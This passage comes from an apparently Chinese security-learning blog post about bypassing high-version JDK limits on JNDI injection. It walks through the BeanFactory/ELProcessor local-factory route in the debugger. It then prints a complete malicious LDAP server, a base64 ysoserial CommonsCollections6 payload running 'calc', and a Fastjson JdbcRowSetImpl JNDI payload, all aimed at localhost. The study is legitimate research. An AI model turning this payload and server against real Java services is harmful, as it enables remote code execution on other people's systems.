src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041539947.png" alt="image-20230804153911744"><br>跟进这个方法，来到getObjectFactoryFromReference这里，在这里方法里面的逻辑发生了变化和之前不一样<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041539002.png" alt="image-20230804153927830"><br>继续跟进getObjectFactoryFromReference这里，这里是从本地加载到了这个工厂即<code>org.apache.naming.factory.BeanFactory</code> 类<br>![[Pasted image 20230804125859.png]]<br>然后继续往下，来到return这里，此时clas的值为<code>org.apache.naming.factory.BeanFactory</code> 将其转换成 <code>ObjectFactory</code> 类型，也就是说，<strong>我们传入的 Factory 类必须实现 ObjectFactory 接口类、而 <code>org.apache.naming.factory.BeanFactory</code> 正好满足这一点</strong>，之前走完这里就会弹出计算器，但是这里不会继续往后<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041539235.png" alt="image-20230804153937646"><br>来到getObjectInstance这里，跟进去看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041539765.png" alt="image-20230804153952355"><br>进来后会判断 obj 参数是否是 <code>ResourceRef</code> 类实例，是的话代码才会往下走，<strong>这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例</strong>：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041540583.png" alt="image-20230804154022351"><br>继续往下，在124行这里获取到<code>javax.el.ELProcessor</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041541720.png" alt="image-20230804154135375"><br>然后继续往下会获取forceString类型的内容，其值是我们构造的 <code>x=eval</code> 内容，到这里是干饭回来继续的，突然发现调的是bind那个服务端不是rebind，不过也差不多，继续<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041540061.png" alt="image-20230804154057904"><br>继续往下调试可以看到，查找 <code>forceString</code> 的内容中是否存在”&#x3D;”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，之前设置的 <code>forceString</code> 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 <code>BeanFactory</code> 类能进行利用的关键点！之后，就是获取 beanClass 即 <code>javax.el.ELProcessor</code> 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041542103.png" alt="image-20230804154200732"><br>然后beanClass通过getMethod方法获取到eval<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041542651.png" alt="image-20230804154220446"><br>接着是多个 do while 语句来遍历获取 ResourceRef 类实例 addr 属性的元素，当获取到 addrType 为 x 的元素时退出当前所有循环，然后调用 <code>getContent()</code> 方法来获取x属性对应的 contents 即恶意表达式。这里就是恶意 RMI 服务端中 ResourceRef 类实例添加的第二个元素：最后通过一系列的判断来到invoke方法执行代码弹出计算器<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041542254.png" alt="image-20230804154232817"></p><h5 id="小结本地恶意-Class"><a href="#小结本地恶意-Class" class="headerlink" title="小结本地恶意 Class"></a>小结本地恶意 Class</h5><p>后面经过第一层的 <code>=x</code>，之后，有添加元素的逻辑，这里涉及到el表达式相关的东西，原理理的不是很清楚，就先这样吧，等学了EL表达式或许再来看看，</p><h4 id="绕过手法二：利用-LDAP-返回序列化数据，触发本地-Gadget"><a href="#绕过手法二：利用-LDAP-返回序列化数据，触发本地-Gadget" class="headerlink" title="绕过手法二：利用 LDAP 返回序列化数据，触发本地 Gadget"></a>绕过手法二：利用 LDAP 返回序列化数据，触发本地 Gadget</h4><p>上面的绕过是在JDK 8u191以后的版本中增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。然后通过服务端本地ClassPath中存在的反序列化漏洞Gadget来绕过高版本JDK的限制。<br>但LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的<code>obj.decodeObject()</code>方法就会对这个字段的内容进行反序列化。此时，如果服务端ClassPath中存在反序列化咯多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。</p><h5 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h5><p>假设目标环境存在Commons-Collections-3.2.1包，且存在JNDI的lookup()注入或Fastjson反序列化漏洞。<br>使用ysoserial工具生成Commons-Collections这条Gadget并进行Base64编码输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 &#x27;calc&#x27; | base64 -w 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=</span><br></pre></td></tr></table></figure><p>恶意LDAP服务器如下，主要是在javaSerializedData字段内填入刚刚生成的反序列化payload数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8000/#ExportObject&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"> </span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Payload1: 利用LDAP+Reference Factory</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Payload2: 返回序列化Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标服务端代码，假设存在JNDI <code>lookup()</code>函数注入或Fastjson反序列化漏洞，此时通过JNDI注入实现反序列化漏洞利用，这里fastjson还没学就利用lookup吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIGadgetClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">// lookup参数注入触发  </span></span><br><span class="line"> <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> context.lookup(<span class="string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// Fastjson反序列化JNDI注入Gadget触发  </span></span><br><span class="line"> <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端和客户端记得加上依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span><span class="number">.80</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041542404.png" alt="image-20230804154256180"></p><h5 id="调试分析运行流程"><a href="#调试分析运行流程" class="headerlink" title="调试分析运行流程"></a>调试分析运行流程</h5><p>这里我没有源码得在下面这里下个断点才能进来<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041543578.png" alt="image-20230804154327399"><br>然后就是一系列的lookup调用，经过<code>p_lookup()</code>然后是<code>c_lookup()</code>最终来到<code>decodeObject()</code>方法这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041543960.png" alt="image-20230804154339622"><br>调用完这里之后就会弹出计算器，所以跟进decodeObject方法看看，在下面146行那里有个<code>getURLClassLoader()</code> 方法在这里获取到字节码<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041544229.png" alt="image-20230804154402034"><br>但是这里不会进行实例化，因为会进入到 <code>trustURLCodebase</code> 的判断，而这里默认就是 false，还是进入这个方法看看吧<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041544217.png" alt="image-20230804154417078"><br>可以看到<code>trustURLCodebase</code>为true才会实例化执行代码，所以这里不行就会跳出然后来到下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041544594.png" alt="image-20230804154424462"><br>执行完这行会弹出计算器，所以跟进去看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041544731.png" alt="image-20230804154432535"><br>最终执行到readObject进行反序列化加载字节码弹出计算器<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041544645.png" alt="image-20230804154443351"><br>调试结束</p><h5 id="小结一下-LDAP-Gadget-恶意加载字节码"><a href="#小结一下-LDAP-Gadget-恶意加载字节码" class="headerlink" title="小结一下 LDAP Gadget 恶意加载字节码"></a>小结一下 LDAP Gadget 恶意加载字节码</h5><p>其实是换了一种思路进行字节码的加载，通过 <code>deserializeObject()</code> 方法的反序列化来进行命令执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有源码最后是用源码来调试，代码看的舒服点不知道那些大佬怎么弄的源码我这里idea无法下载，跟完之后感觉使用本地的Reference Factory类来绕过这里理的还不是很清晰等后面学到EL表达式和fastjson再看看吧</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-1">Java反序列化之JNDI学习 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/">高低JDK版本中JNDI注入 – JohnFrod’s Blog</a><br><a href="https://www.cnblogs.com/bitterz/p/15946406.html">java高版本下各种JNDI Bypass方法复现 - bitterz - 博客园 (cnblogs.com)</a><br><a href="https://www.bilibili.com/video/BV1ct4y1h79t/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1ct4y1h79t/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之Shiro721</title>
      <link href="/undefined/54699.html"/>
      <url>/undefined/54699.html</url>
      
